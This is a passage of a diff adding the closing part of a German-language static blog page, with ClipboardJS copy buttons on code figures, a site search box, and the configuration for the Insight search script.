+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Suche etwas..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+    
+</body>
+</html>
